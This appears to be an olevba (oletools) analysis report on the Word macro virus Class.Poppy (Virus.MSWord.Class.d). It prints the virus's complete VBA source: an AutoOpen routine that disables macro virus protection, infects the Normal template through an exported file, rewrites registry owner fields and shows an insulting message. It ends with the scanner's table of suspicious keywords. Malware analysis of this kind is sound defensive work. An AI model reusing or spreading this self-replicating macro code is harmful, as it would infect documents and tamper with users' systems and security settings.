olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-dadf1e3ccacdb5354fa5c362ee06b2f98b82e6d9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-dadf1e3ccacdb5354fa5c362ee06b2f98b82e6d9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'PETO18.6.1999 8:45:17HP LaserJet 5L PCL on LPT1:dokument
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
Const REG_SZ As Long = 1
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
Const HKEY_CURRENT_USER As Long = &H80000001
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
Sub AutoOpen()
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
On Error GoTo out
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
Options.VirusProtection = False
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
Options.SaveNormalPrompt = False
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
Options.ConfirmConversions = False
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
If nt > 70 And ad > 0 Then GoTo out
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
If nt < 70 Then
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
End If
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
host.codemodule.AddFromFile ("c:\class.sys")
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
With host.codemodule
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
    For x = 1 To 16
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
    .deletelines 1
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
    Next x
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
End With
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
If nt < 70 Then
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
    With host.codemodule
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
    .replaceline 1, "Sub AutoClose()"
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
    .replaceline 91, "Sub ToolsMacro()"
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
    For x = 70 To 81
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
        .deletelines 62
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
    Next x
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
    .replaceline 35, "    For x = 1 To 4"
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
    End With
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
End If
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
If nt < 70 Then
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
u = RegCloseKey(k)
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
End If
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
With host.codemodule
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
    For x = 2 To 104 Step 2
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
    Next x
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
End With
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
out:
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
End Sub
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
Sub ViewVBCode()
'PETO18.6.1999 8:45:18HP LaserJet 5L PCL on LPT1:dokument
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

